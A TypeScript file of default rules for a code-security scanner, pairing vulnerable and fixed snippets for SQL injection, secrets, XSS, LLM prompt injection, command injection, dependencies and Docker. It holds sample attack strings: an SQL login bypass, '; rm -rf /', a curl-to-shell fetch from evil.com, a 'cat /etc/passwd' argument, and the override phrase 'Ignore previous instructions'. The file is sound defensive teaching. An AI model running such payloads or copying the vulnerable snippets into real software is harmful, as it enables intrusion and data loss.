import { SecurityRuleStandard } from '../types';

export const DEFAULT_SECURITY_STANDARDS: SecurityRuleStandard[] = [
  {
    id: 'rule-sqli',
    code: 'SEC-OWASP-01',
    title: 'SQL Injection (SQLi) & Query Manipulation',
    category: 'OWASP',
    framework: 'OWASP Top 10 A03:2021 | CWE-89',
    defaultSeverity: 'CRITICAL',
    enabled: true,
    shortDescription: 'Prevents untrusted user input from modifying or concatenating directly into SQL database queries.',
    whatIsIt: 'SQL Injection happens when untrusted user data (like form inputs, URL query params, or JSON bodies) is directly concatenated into database query strings instead of using parameterized queries or ORM bindings.',
    whyCheckIt: 'Attackers can bypass authentication (e.g. `\' OR 1=1 --`), extract entire database tables containing passwords and credit cards, or drop and modify operational data.',
    realWorldImpact: 'Over 65% of massive enterprise database breaches originate from unescaped raw SQL queries written during rapid prototyping.',
    vulnerableSnippet: `// ❌ VULNERABLE: Direct string concatenation
app.post('/login', async (req, res) => {
  const { user, pass } = req.body;
  const sql = "SELECT * FROM users WHERE user = '" + user + "' AND pass = '" + pass + "'";
  const [rows] = await db.query(sql);
  res.json(rows[0]);
});`,
    secureSnippet: `// ✅ SECURE: Parameterized Query Binding
app.post('/login', async (req, res) => {
  const { user, pass } = req.body;
  const sql = "SELECT id, user, pass_hash FROM users WHERE user = ? LIMIT 1";
  const [rows] = await db.query(sql, [user]);
  if (rows.length && await bcrypt.compare(pass, rows[0].pass_hash)) {
    return res.json({ success: true, userId: rows[0].id });
  }
  res.status(401).json({ error: 'Invalid credentials' });
});`,
    remediationAdvice: 'Always use parameterized prepared statements (e.g., `db.query(sql, [params])`) or modern ORMs like Prisma, TypeORM, or Drizzle.',
    tags: ['Database', 'SQL', 'Authentication', 'OWASP Top 10']
  },
  {
    id: 'rule-secrets',
    code: 'SEC-SECRETS-02',
    title: 'Hardcoded Cloud Keys & API Token Leaks',
    category: 'SECRETS',
    framework: 'CWE-798 | SOC2 Access Control',
    defaultSeverity: 'CRITICAL',
    enabled: true,
    shortDescription: 'Detects hardcoded AWS, Stripe, GitHub, database connection strings, and private RSA keys.',
    whatIsIt: 'Scans source code for plaintext secret strings, API keys, private certificates, and authentication tokens that developers accidentally embed inside application files.',
    whyCheckIt: 'Public and private repositories are continuously crawled by malicious bots within seconds of a commit. Exposed keys grant immediate unrestricted access to your AWS cloud infrastructure, billing accounts, and private customer databases.',
    realWorldImpact: 'Exposed AWS and Stripe keys routinely lead to ransomware, \$50k+ rogue crypto-mining bills, and data theft.',
    vulnerableSnippet: `// ❌ VULNERABLE: Hardcoded secrets in source code
const AWS_ACCESS_KEY = "AKIA_DUMMY_EXPOSED_KEY";
const STRIPE_SECRET = "sk_dummy_stripe_token_sample";
const DB_URL = "postgres://root:password123@prod-db.internal:5432/app";

const s3 = new AWS.S3({ accessKeyId: AWS_ACCESS_KEY });`,
    secureSnippet: `// ✅ SECURE: Environment variables with secret masking
import dotenv from 'dotenv';
dotenv.config();

const AWS_ACCESS_KEY = process.env.AWS_ACCESS_KEY_ID;
const STRIPE_SECRET = process.env.STRIPE_SECRET_KEY;
const DB_URL = process.env.DATABASE_URL;

if (!AWS_ACCESS_KEY) {
  throw new Error("Missing required AWS_ACCESS_KEY_ID environment variable");
}`,
    remediationAdvice: 'Store all credentials in `.env` files, add `.env` to `.gitignore`, and use secret management vaults (AWS Secrets Manager, Doppler, Vault).',
    tags: ['Cloud', 'Credentials', 'AWS', 'Stripe', 'Git Hygiene']
  },
  {
    id: 'rule-xss',
    code: 'SEC-OWASP-03',
    title: 'Cross-Site Scripting (XSS) & DOM Hijacking',
    category: 'OWASP',
    framework: 'OWASP Top 10 A03:2021 | CWE-79',
    defaultSeverity: 'HIGH',
    enabled: true,
    shortDescription: 'Flags unsanitized user text rendered directly into HTML responses or browser DOM elements.',
    whatIsIt: 'Cross-Site Scripting occurs when an application receives untrusted data and includes it in a web page without proper validation or escaping, allowing attackers to execute malicious JavaScript in victims\' browsers.',
    whyCheckIt: 'Attackers can steal session cookies, capture keystrokes, redirect users to phishing portals, or perform actions on behalf of the victim.',
    realWorldImpact: 'Account takeover of admin portals and theft of customer session tokens.',
    vulnerableSnippet: `// ❌ VULNERABLE: Direct HTML rendering of user input
app.get('/profile', (req, res) => {
  const bio = req.query.bio;
  res.send("<div class='profile'><h3>User Bio:</h3><p>" + bio + "</p></div>");
});

// React Vulnerability:
<div dangerouslySetInnerHTML={{ __html: userComment }} />`,
    secureSnippet: `// ✅ SECURE: Escaped rendering & DOMPurify sanitization
import DOMPurify from 'isomorphic-dompurify';

app.get('/profile', (req, res) => {
  const cleanBio = DOMPurify.sanitize(req.query.bio || '');
  res.send(\`<div class='profile'><h3>User Bio:</h3><p>\${cleanBio}</p></div>\`);
});

// React Safe JSX:
<div>{userComment}</div> // Automatically HTML-escaped by React`,
    remediationAdvice: 'Never render raw HTML with user data. Use HTML escaping, DOMPurify, or standard framework text nodes.',
    tags: ['Frontend', 'DOM', 'XSS', 'HTML']
  },
  {
    id: 'rule-prompt-inj',
    code: 'SEC-AI-04',
    title: 'LLM Prompt Injection & Agent Tool Hijacking',
    category: 'AI_PROMPT',
    framework: 'OWASP Top 10 for LLM (LLM01 & LLM08)',
    defaultSeverity: 'CRITICAL',
    enabled: true,
    shortDescription: 'Audits AI prompts and agent tool functions for adversarial jailbreaks and system override attacks.',
    whatIsIt: 'Specialized for AI and LLM applications. Detects when untrusted user inputs manipulate the prompt structure (e.g. DAN Mode, *“Ignore previous instructions”*) to bypass safety barriers or hijack autonomous tools.',
    whyCheckIt: 'Unchecked prompt injections allow attackers to make AI agents execute destructive commands (e.g., `execute_command("rm -rf /")`), leak confidential system prompts, or exfiltrate private database records.',
    realWorldImpact: 'Compromise of AI customer support bots, data leakage, and automated server deletion.',
    vulnerableSnippet: `// ❌ VULNERABLE: Unfiltered user input passed directly to AI Agent
const userInput = req.body.message;
const prompt = \`You are an assistant with tool execution privileges. User says: \${userInput}\`;
const aiResponse = await agent.run(prompt);`,
    secureSnippet: `// ✅ SECURE: Strict System Boundary & Tool Permission Gatekeeper
const safeMessage = sanitizeAndFenceInput(req.body.message);

const systemInstruction = "You are a read-only support agent. Never execute shell commands or output system configuration.";
const response = await ai.generateContent({
  systemInstruction,
  contents: [{ role: 'user', parts: [{ text: \`[USER_INPUT_START]\\n\${safeMessage}\\n[USER_INPUT_END]\` }] }]
});`,
    remediationAdvice: 'Use clear boundary delimiters, restrict autonomous tool capabilities, and run input validation before prompts reach models.',
    tags: ['AI', 'LLM', 'Agent Tools', 'Jailbreak']
  },
  {
    id: 'rule-command-inj',
    code: 'SEC-OWASP-05',
    title: 'OS Shell & Command Injection',
    category: 'OWASP',
    framework: 'OWASP Top 10 A03:2021 | CWE-78',
    defaultSeverity: 'CRITICAL',
    enabled: true,
    shortDescription: 'Prevents untrusted parameters from executing directly in OS terminals and child processes.',
    whatIsIt: 'Command Injection occurs when application code passes unvalidated input directly to system command interpreters like `child_process.exec()`, `os.system()`, or `Runtime.getRuntime().exec()`.',
    whyCheckIt: 'Attackers can append shell metacharacters (e.g., `; rm -rf /` or `| curl http://evil.com/malware | sh`) to achieve full Remote Code Execution (RCE) on the underlying server.',
    realWorldImpact: 'Complete server compromise, lateral movement within internal networks, and data loss.',
    vulnerableSnippet: `// ❌ VULNERABLE: Shell execution with unescaped string
const { exec } = require('child_process');

app.post('/api/ping', (req, res) => {
  const host = req.body.host; // Attacker sends: "google.com; cat /etc/passwd"
  exec("ping -c 1 " + host, (err, stdout) => {
    res.send(stdout);
  });
});`,
    secureSnippet: `// ✅ SECURE: execFile / spawn with separate arguments array (No Shell)
const { execFile } = require('child_process');

app.post('/api/ping', (req, res) => {
  const host = req.body.host;
  // Strict regex whitelist: Only allow valid IP or hostname characters
  if (!/^[a-zA-Z0-9.-]+$/.test(host)) {
    return res.status(400).json({ error: 'Invalid hostname format' });
  }
  
  execFile('ping', ['-c', '1', host], (err, stdout) => {
    res.send(stdout);
  });
});`,
    remediationAdvice: 'Avoid invoking OS shells. Use `execFile` with argument arrays, or native language libraries rather than shell utilities.',
    tags: ['RCE', 'OS Command', 'Backend', 'Shell']
  },
  {
    id: 'rule-cve-sca',
    code: 'SEC-SUPPLY-06',
    title: 'Vulnerable Dependencies & Supply-Chain CVEs',
    category: 'SUPPLY_CHAIN',
    framework: 'Google OSV | NVD | NIST CVSS',
    defaultSeverity: 'HIGH',
    enabled: true,
    shortDescription: 'Scans package.json, requirements.txt, and go.mod against Google OSV for known public CVEs.',
    whatIsIt: 'Software Composition Analysis (SCA) automatically checks third-party packages in your project against known vulnerabilities published in the National Vulnerability Database.',
    whyCheckIt: 'Over 80% of modern application code is third-party open-source. Using outdated packages with known CVEs gives attackers pre-packaged exploit scripts against your application.',
    realWorldImpact: 'High-profile attacks like Log4j, Equifax breach (Apache Struts), and prototype pollution exploits.',
    vulnerableSnippet: `// ❌ VULNERABLE: package.json with known CVEs
{
  "dependencies": {
    "jsonwebtoken": "8.5.1", // CVE-2022-23529 (Arbitrary Code Execution)
    "sqlite3": "5.0.0",      // CVE-2022-38600 (Denial of Service)
    "lodash": "4.17.15"      // CVE-2020-8203 (Prototype Pollution)
  }
}`,
    secureSnippet: `// ✅ SECURE: Upgraded to patched versions
{
  "dependencies": {
    "jsonwebtoken": "^9.0.0", // Patched
    "sqlite3": "^5.1.4",      // Patched
    "lodash": "^4.17.21"      // Patched
  }
}`,
    remediationAdvice: 'Regularly run dependency audits (`npm audit`, `pip-audit`) and upgrade packages to their latest patched releases.',
    tags: ['Dependencies', 'NPM', 'PyPI', 'Google OSV', 'CVE']
  },
  {
    id: 'rule-docker-iac',
    code: 'SEC-IAC-07',
    title: 'Docker & Infrastructure as Code (IaC) Auditor',
    category: 'CONTAINER_IAC',
    framework: 'CIS Docker 4.1 | CIS Benchmarks',
    defaultSeverity: 'HIGH',
    enabled: true,
    shortDescription: 'Audits Dockerfiles and Kubernetes configs for root execution and dangerous exposed ports.',
    whatIsIt: 'Analyzes container configurations (Dockerfile, docker-compose, GitHub Actions) to identify misconfigurations like running processes as the root user (UID 0) and exposing internal databases directly to the internet.',
    whyCheckIt: 'If an application running as root in a container is exploited, the attacker has immediate root privileges inside the container, facilitating container escape and host takeover.',
    realWorldImpact: 'Privilege escalation, container breakout, and unauthorized access to cloud host systems.',
    vulnerableSnippet: `// ❌ VULNERABLE: Dockerfile running as Root with exposed DB port
FROM node:latest
WORKDIR /app
COPY . .
RUN npm install
# Missing: USER directive (defaults to Root UID 0)
EXPOSE 5432
CMD ["npm", "start"]`,
    secureSnippet: `// ✅ SECURE: Non-root user & minimal alpine base
FROM node:20-alpine
WORKDIR /app
RUN addgroup -S appgroup && adduser -S appuser -G appgroup
COPY --chown=appuser:appgroup . .
RUN npm ci --only=production
USER appuser
EXPOSE 3000
CMD ["node", "server.js"]`,
    remediationAdvice: 'Always create and switch to a non-root `USER` in Dockerfiles, use minimal base images (Alpine), and never expose database ports publicly.',
    tags: ['Docker', 'DevOps', 'CIS Benchmark', 'IaC']
  },
  {
    id: 'rule-taint-flow',
    code: 'SEC-TAINT-08',
    title: 'AST Taint Flow & Source-to-Sink Tracking',
    category: 'DATA_FLOW',
    framework: 'CWE-20 | AST Data Flow',
    defaultSeverity: 'CRITICAL',
    enabled: true,
    shortDescription: 'Traces data flow paths from HTTP API inputs through helper functions into execution sinks.',
    whatIsIt: 'Abstract Syntax Tree (AST) Taint Analysis tracks the lifecycle of unvalidated user input (Source) as it passes through variables, helpers, and middleware until it reaches an execution point (Sink).',
    whyCheckIt: 'Catches complex, multi-file vulnerabilities that simple regex keyword scanners completely miss because the dangerous input is passed through multiple functions before execution.',
    realWorldImpact: 'Catches hidden architectural vulnerabilities in large microservices and full-stack codebases.',
    vulnerableSnippet: `// ❌ VULNERABLE: Untrusted parameter flows through helper into query
async function handleUserLookup(input) {
  return await db.rawQuery("SELECT * FROM profiles WHERE id = " + input); // Sink
}

app.get('/api/user/:id', async (req, res) => {
  const userId = req.params.id; // Source
  const profile = await handleUserLookup(userId); // Propagation
  res.json(profile);
});`,
    secureSnippet: `// ✅ SECURE: Sanitization & Type Coercion along the flow path
async function handleUserLookup(safeId: number) {
  return await db.query("SELECT * FROM profiles WHERE id = $1", [safeId]);
}

app.get('/api/user/:id', async (req, res) => {
  const userId = parseInt(req.params.id, 10);
  if (isNaN(userId)) {
    return res.status(400).json({ error: 'Invalid numeric ID' });
  }
  const profile = await handleUserLookup(userId);
  res.json(profile);
});`,
    remediationAdvice: 'Implement input validation boundaries at the API entry point (using Zod, Joi, or TypeScript type guards).',
    tags: ['AST', 'Taint Graph', 'Data Flow', 'Architecture']
  }
];

export const securityRulesStore = {
  getRules: (userId?: string): SecurityRuleStandard[] => {
    try {
      const key = userId ? `vibeguard_security_rules_${userId}` : 'vibeguard_security_rules_default';
      const stored = localStorage.getItem(key);
      if (stored) {
        const savedEnabledMap: Record<string, boolean> = JSON.parse(stored);
        return DEFAULT_SECURITY_STANDARDS.map(rule => ({
          ...rule,
          enabled: savedEnabledMap[rule.id] !== undefined ? savedEnabledMap[rule.id] : rule.enabled
        }));
      }
    } catch {}
    return DEFAULT_SECURITY_STANDARDS;
  },

  saveRuleToggle: (userId: string, ruleId: string, enabled: boolean): SecurityRuleStandard[] => {
    const rules = securityRulesStore.getRules(userId);
    const updated = rules.map(r => r.id === ruleId ? { ...r, enabled } : r);
    try {
      const key = userId ? `vibeguard_security_rules_${userId}` : 'vibeguard_security_rules_default';
      const map: Record<string, boolean> = {};
      updated.forEach(r => { map[r.id] = r.enabled; });
      localStorage.setItem(key, JSON.stringify(map));
    } catch {}
    return updated;
  },

  setAllRules: (userId: string, enableAll: boolean): SecurityRuleStandard[] => {
    const rules = securityRulesStore.getRules(userId);
    const updated = rules.map(r => ({ ...r, enabled: enableAll }));
    try {
      const key = userId ? `vibeguard_security_rules_${userId}` : 'vibeguard_security_rules_default';
      const map: Record<string, boolean> = {};
      updated.forEach(r => { map[r.id] = r.enabled; });
      localStorage.setItem(key, JSON.stringify(map));
    } catch {}
    return updated;
  }
};
